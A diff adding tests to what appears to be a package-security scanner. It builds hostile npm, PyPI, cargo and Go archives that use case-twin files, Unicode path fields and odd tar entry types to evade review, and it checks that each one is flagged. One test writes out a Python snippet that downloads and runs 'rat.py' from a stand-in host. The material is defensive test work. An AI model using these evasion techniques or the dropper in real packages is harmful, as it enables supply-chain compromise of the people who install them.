@@ -20,6 +20,7 @@ installers do.
 
 import bz2
 import gzip
+import io
 import lzma
 import os
 import shutil
@@ -34,7 +35,7 @@ from unittest import mock
 from lazaret.registry import repo
 from tests.registry._review_support import (
     DECODE_EXEC_JS, DECODE_EXEC_PY, EXFIL_JS, hooks, issues, manifest, rules, scan_bytes,
-    scan_wheel, tar_member, zipball)
+    scan_wheel, tar_member, unicode_path, zip_entries, zipball)
 
 HOOKED = hooks(postinstall="node index.js").encode()
 PAYLOAD = DECODE_EXEC_JS.encode()
@@ -168,6 +169,105 @@ class PathTests(unittest.TestCase):
                          [("index.js", "MAJOR")])
         self.assertEqual(res["verdict"], "WARN")
 
+    def test_paths_that_differ_only_by_case(self):
+        # EG-4: on macOS and Windows the later entry is written over the earlier, under its name: the main file
+        # runs the twin's bytes there, so the twin gets the import-time test too
+        raw = (tar_member("package/package.json", manifest(main="index.js"))
+               + tar_member("package/index.js", "module.exports = 1;\n")
+               + tar_member("package/INDEX.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertEqual({i["file"] for i in issues(res, "SC-IMPORT-RISK")}, {"INDEX.js"})
+        case = [i for i in issues(res, "SC-ARCHIVE-DUP") if i["name"] == "Archive paths that differ only by case"]
+        self.assertEqual([(i["file"], i["sev"]) for i in case], [("INDEX.js", "MAJOR")])
+        self.assertIn("'index.js'", case[0]["msg"])
+        # Unicode normalization too (macOS's file systems ignore it): é composed, then decomposed
+        raw = (tar_member("package/package.json", manifest()) + tar_member("package/caf\u00e9.js", "1;\n")
+               + tar_member("package/cafe\u0301.js", "2;\n") + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(len([i for i in issues(res, "SC-ARCHIVE-DUP")
+                              if i["name"] == "Archive paths that differ only by case"]), 1)
+        self.assertEqual(repo.case_fold("Lib/CAF\u00c9.JS"), repo.case_fold("lib/cafe\u0301.js"))
+
+    def test_the_fold_is_the_same_on_every_python(self):
+        # BR-2: the fold is the engine's, on its Unicode 13.0 (Python 3.10's), not the host Python's: Glagolitic's
+        # caudate chri (U+2C2F and U+2C5F, from Unicode 14.0) folded together on 3.11 and later and not on 3.10, so
+        # the same release had a case pair on one and none on the other. Neither has one now; the full folds are
+        # the same as before (ß and ẞ to ss, ς and Σ to σ, ﬃ to ffi)
+        raw = (tar_member("package/package.json", manifest()) + tar_member("package/x\u2c2f.js", "1;\n")
+               + tar_member("package/x\u2c5f.js", "2;\n") + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual([i["file"] for i in issues(res, "SC-ARCHIVE-DUP")], [])
+        self.assertNotEqual(repo.case_fold("x\u2c2f.js"), repo.case_fold("x\u2c5f.js"))
+        self.assertEqual(repo.case_fold("Stra\u00dfe.JS"), "strasse.js")
+        self.assertEqual(repo.case_fold("\u1e9e/\u03c2/\ufb03"), repo.case_fold("SS/\u03a3/FFI"))
+        self.assertEqual(repo.case_fold("\udc80A.js"), "\udc80a.js")         # (a name read with surrogateescape)
+
+    def test_a_case_twin_of_the_manifest_is_read_as_the_manifest(self):
+        # EG-4's leftover: on macOS and Windows, Package.json written after package.json is the package.json npm
+        # reads there: its install hook runs, and what its main names is an entry
+        raw = (tar_member("package/package.json", manifest(main="index.js"))
+               + tar_member("package/Package.json", manifest(main="lib/real.js", scripts={"postinstall": "node setup.js"}))
+               + tar_member("package/index.js", "module.exports = 1;\n")
+               + tar_member("package/lib/real.js", EXFIL_JS)
+               + tar_member("package/setup.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("Package.json", "CRITICAL")])
+        self.assertIn("lib/real.js", {i["file"] for i in issues(res, "SC-IMPORT-RISK")})
+        # (one written alone under another case is opened as package.json there too; nested ones are read as nested)
+        raw = (tar_member("package/PACKAGE.JSON", hooks(install="node setup.js"))
+               + tar_member("package/setup.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("PACKAGE.JSON", "CRITICAL")])
+
+    def test_a_path_node_opens_under_another_case(self):
+        # EG-4's leftover: on macOS and Windows `node Setup.js` runs setup.js, and require('./Lib/Core') loads
+        # lib/core.js (where the exact name is not there: on Linux they fail)
+        raw = (tar_member("package/package.json", manifest(main="index.js", scripts={"postinstall": "node Setup.js"}))
+               + tar_member("package/setup.js", EXFIL_JS)
+               + tar_member("package/index.js", "module.exports = require('./Lib/Core');\n")
+               + tar_member("package/lib/core.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("package.json", "CRITICAL")])
+        self.assertIn("Install hook runs Setup.js, which", issues(res, "SC-INSTALL-HOOK")[0]["msg"])
+        self.assertIn("lib/core.js", {i["file"] for i in issues(res, "SC-IMPORT-RISK")})
+
+    def test_node_tries_each_name_under_any_case_before_the_next(self):
+        # EG-9: `node Setup` tries Setup, then Setup.js, then Setup.json; on macOS and Windows Setup.js opens setup.js,
+        # so that runs, though Setup.json is there under its exact name (on Linux, Setup.json would be read); and a
+        # folder's package.json under another case names its main there too
+        raw = (tar_member("package/package.json", manifest(main="index.js", scripts={"postinstall": "node Setup"}))
+               + tar_member("package/Setup.json", '{"a": 1}\n')
+               + tar_member("package/setup.js", EXFIL_JS)
+               + tar_member("package/index.js", "module.exports = require('./lib');\n")
+               + tar_member("package/lib/Package.json", '{"main": "core.js"}\n')
+               + tar_member("package/lib/core.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertIn("Install hook runs Setup, which", issues(res, "SC-INSTALL-HOOK")[0]["msg"])
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("package.json", "CRITICAL")])
+        self.assertIn("lib/core.js", {i["file"] for i in issues(res, "SC-IMPORT-RISK")})
+
+    def test_a_case_variant_of_setup_py_or_pyproject_is_run_by_pip(self):
+        # EG-4's leftover: pip opens setup.py where case is ignored, and so Setup.py; and a pyproject.toml's backend
+        def sdist(*members):
+            return gzip.compress(b"".join(tar_member("x-1.0/" + n, d) for n, d in members) + b"\0" * 1024)
+        pkg_info = ("PKG-INFO", "Metadata-Version: 2.1\nName: x\nVersion: 1.0\n")
+        run = ("import requests, subprocess, sys\nr = requests.get('https://cdn.invalid/rat.py')\n"
+               "with open('rat.py', 'wb') as f:\n    f.write(r.content)\nsubprocess.check_call([sys.executable, 'rat.py'])\n")
+        res = scan_bytes(sdist(pkg_info, ("setup.py", "from setuptools import setup\nsetup()\n"), ("Setup.py", run)),
+                         artifact="sdist", eco="pypi")
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("Setup.py", "CRITICAL")])
+        self.assertIn("Setup.py runs when pip builds or installs this sdist", issues(res, "SC-INSTALL-HOOK")[0]["msg"])
+        backend = '[build-system]\nrequires = []\nbuild-backend = "hooks"\nbackend-path = ["_build"]\n'
+        res = scan_bytes(sdist(pkg_info, ("PyProject.toml", backend), ("_build/hooks.py", run)),
+                         artifact="sdist", eco="pypi")
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("_build/hooks.py", "CRITICAL")])
+
     def test_traversal_entry_is_flagged_not_scanned(self):
         raw = (tar_member("package/index.js", "1;\n") + tar_member("package/../evil.js", PAYLOAD)
                + b"\0" * 1024)
@@ -227,6 +327,150 @@ class LinkTests(unittest.TestCase):
         link = issues(res, "SC-ARCHIVE-LINK")
         self.assertEqual([(i["file"], i["sev"]) for i in link], [("x/helper.py", "MAJOR")])
         self.assertIn("Zip entry marked as a symlink", link[0]["msg"])
+
+
+class UnicodePathTests(unittest.TestCase):
+    """A zip entry's Info-ZIP Unicode Path field (0x7075) names it again (the review of Oct 7). zipfile reads it from
+    Python 3.12, so pip installs the entry under the field's name there and under its header's before; yauzl (VS
+    Code's reader) reads it too. Lazaret reads both names on every Python."""
+
+    PTH = "import os; os.system('true')\n"
+
+    def wheel(self, extra, header="x/notes.txt"):
+        return zip_entries([("x/__init__.py", "", b""), (header, self.PTH, extra)])
+
+    def test_the_names_an_entry_goes_by(self):
+        import zipfile
+        data = zip_entries([("x/notes.txt", "", unicode_path("x/notes.txt", "x.pth")),
+                            ("x/a.txt", "", unicode_path("x/a.txt", "x/b.txt", crc=7)),
+                            ("x/c.txt", "", b""),
+                            ("x/d\x01.txt", "", b"")])
+        with zipfile.ZipFile(io.BytesIO(data)) as zf:
+            names = [repo.zip_entry_names(i) for i in zf.infolist()]
+        self.assertEqual(names, [("x/notes.txt", "x.pth", True, "x.pth", None),
+                                 ("x/a.txt", "x/a.txt", False, "x/a.txt", None),
+                                 ("x/c.txt", "x/c.txt", False, "x/c.txt", None),
+                                 ("x/d\x01.txt", "x/d\u263a.txt", False, "x/d\x01.txt", None)])
+
+    def test_a_wheel_entry_pip_installs_under_another_name_from_python_3_12(self):
+        res = scan_bytes(self.wheel(unicode_path("x/notes.txt", "x.pth")), container="zip", artifact="wheel",
+                         eco="pypi")
+        self.assertIn("x.pth", {i["file"] for i in issues(res, "SC-PTH-EXEC")})
+        two = [i for i in issues(res, "SC-ARCHIVE-PATH") if i["name"] == "Archive entry with two names"]
+        self.assertEqual([(i["file"], i["sev"]) for i in two], [("x.pth", "MAJOR")])
+        self.assertIn("'x/notes.txt'", two[0]["msg"])
+        # an entry whose header has no name, which a field names (it used to be passed over as nameless)
+        res = scan_bytes(self.wheel(unicode_path("", "x.pth"), header=""), container="zip", artifact="wheel",
+                         eco="pypi")
+        self.assertIn("x.pth", {i["file"] for i in issues(res, "SC-PTH-EXEC")})
+        # a zip sdist too (pip extracts it with zipfile)
+        sdist = zip_entries([("x-1.0/PKG-INFO", "Name: x\n", b""),
+                             ("x-1.0/docs/notes.txt", DECODE_EXEC_PY, unicode_path("x-1.0/docs/notes.txt",
+                                                                                   "x-1.0/setup.py"))])
+        res = scan_bytes(sdist, container="zip", artifact="sdist", eco="pypi")
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertIn("setup.py", {i["file"] for i in issues(res, "SC-EVAL-DECODE")})
+
+    def test_a_field_that_does_not_apply_is_not_read(self):
+        for extra in (unicode_path("x/notes.txt", "x.pth", crc=7), unicode_path("x/notes.txt", "x.pth", version=2),
+                      unicode_path("x/notes.txt", "")):
+            with self.subTest(extra=extra):
+                res = scan_bytes(self.wheel(extra), container="zip", artifact="wheel", eco="pypi")
+                self.assertEqual(res["verdict"], "OK", res["issues"])
+
+    def test_a_field_zipfile_from_python_3_12_refuses_is_incomplete(self):
+        # pip from Python 3.12 installs nothing of the wheel, and Lazaret there reads none of it: INCOMPLETE on
+        # every Python
+        short = b"\x75\x70\x03\x00\x01\x00\x00"
+        for extra in (short, unicode_path("x/notes.txt", b"x\xff.pth")):
+            with self.subTest(extra=extra):
+                res = scan_bytes(self.wheel(extra), container="zip", artifact="wheel", eco="pypi")
+                self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
+
+    def test_a_go_module_zip_is_read_by_its_header_names(self):
+        # Go's archive/zip reads no Unicode Path field
+        data = zip_entries([("example.com/m@v1.0.0/go.mod", "module example.com/m\n", b""),
+                            ("example.com/m@v1.0.0/notes.txt", "", unicode_path("example.com/m@v1.0.0/notes.txt",
+                                                                                "example.com/m@v1.0.0/x.go"))])
+        names = [m[0].rsplit("/", 1)[-1] for m in repo.iter_archive(data, "zip", "gomod")]
+        self.assertEqual(sorted(names), ["go.mod", "notes.txt"])
+
+
+def typed_member(name, data, typ):
+    """One raw ustar member of type `typ` that carries `data`, as a hostile
+    archive writes it: a device, a FIFO or an unknown type with a size."""
+    ti = tarfile.TarInfo(name)
+    ti.type, ti.mode, ti.size = typ, 0o644, len(data)
+    return ti.tobuf(tarfile.USTAR_FORMAT) + data + b"\0" * (-len(data) % 512)
+
+
+class EntryTypeTests(unittest.TestCase):
+    """The Go/Rust review's RM-1 (Oct 4, 2026): a tar entry that is not a
+    regular file, a directory or a link. pip writes one of a type no tool
+    writes (`9`, `A`) as a regular file, and cargo any entry but a directory
+    or a link as one (a device and a FIFO too); the scan read regular files
+    only, so a setup.py or a build.rs of such a type ran and was never read
+    (the release was OK). npm's node-tar skips them, as the scan does."""
+
+    PKG_INFO = b"Metadata-Version: 2.1\nName: x\nVersion: 1.0\n"
+
+    def sdist(self, typ):
+        return gzip.compress(tar_member("x-1.0/PKG-INFO", self.PKG_INFO)
+                             + typed_member("x-1.0/setup.py", DECODE_EXEC_PY.encode(), typ)
+                             + tar_member("x-1.0/README.md", b"x\n") + b"\0" * 1024)
+
+    def crate(self, typ):
+        return gzip.compress(tar_member("x-1.0.0/Cargo.toml", b'[package]\nname = "x"\nversion = "1.0.0"\n')
+                             + typed_member("x-1.0.0/build.rs", b"fn main() {}\n", typ)
+                             + typed_member("x-1.0.0/tools/run.js", EXFIL_JS.encode(), typ)
+                             + tar_member("x-1.0.0/README.md", b"x\n") + b"\0" * 1024)
+
+    def read(self, data, artifact):
+        anomalies = []
+        names = [m[0] for m in repo.iter_archive(data, "tgz", artifact, anomalies=anomalies)]
+        return names, anomalies
+
+    def test_pip_writes_an_entry_of_an_unknown_type_as_a_file(self):
+        for typ in (b"9", b"A", b"Z"):
+            with self.subTest(typ=typ):
+                names, anomalies = self.read(self.sdist(typ), "sdist")
+                self.assertEqual(names, ["PKG-INFO", "setup.py", "README.md"])
+                self.assertEqual([(k, p) for k, p, _ in anomalies], [("type", "setup.py")])
+                res = scan_bytes(self.sdist(typ), artifact="sdist", eco="pypi")
+                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+                self.assertIn("setup.py", {i["file"] for i in issues(res, "SC-EVAL-DECODE")})
+                self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-ARCHIVE-TYPE")], [("setup.py", "MAJOR")])
+
+    def test_cargo_writes_any_entry_but_a_folder_or_a_link_as_a_file(self):
+        for typ in (b"9", b"A", tarfile.CHRTYPE, tarfile.BLKTYPE, tarfile.FIFOTYPE):
+            with self.subTest(typ=typ):
+                names, anomalies = self.read(self.crate(typ), "crate")
+                self.assertEqual(names, ["Cargo.toml", "build.rs", "tools/run.js", "README.md"])   # (the data read by its size)
+                self.assertEqual([(k, p) for k, p, _ in anomalies], [("type", "build.rs"), ("type", "tools/run.js")])
+                res = repo._scan_artifact(self.crate(typ), "tgz", "crate", False, repo.Budget())
+                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+                self.assertIn("SC-ARCHIVE-TYPE", rules(res))
+
+    def test_a_device_in_an_sdist_is_not_a_file_pip_writes(self):
+        # pip fails on a device or a FIFO; the entry is not read, and its data is the ambiguity it was
+        names, _anomalies = self.read(self.sdist(tarfile.CHRTYPE), "sdist")
+        self.assertNotIn("setup.py", names)
+
+    def test_npm_skips_them_as_node_tar_does(self):
+        raw = (tar_member("package/package.json", manifest())
+               + typed_member("package/index.js", EXFIL_JS.encode(), b"9")
+               + tar_member("package/after.js", b"1\n") + b"\0" * 1024)
+        names, anomalies = self.read(gzip.compress(raw), "npm")
+        self.assertEqual(names, ["package.json", "after.js"])
+        self.assertEqual(anomalies, [])
+        self.assertEqual(scan_bytes(gzip.compress(raw))["verdict"], "OK")
+
+    def test_regular_files_are_unchanged(self):
+        for artifact, data in (("sdist", self.sdist(tarfile.REGTYPE)), ("crate", self.crate(tarfile.REGTYPE))):
+            with self.subTest(artifact=artifact):
+                names, anomalies = self.read(data, artifact)
+                self.assertEqual(anomalies, [])
+                self.assertIn("README.md", names)
 
 
 class BudgetTests(unittest.TestCase):
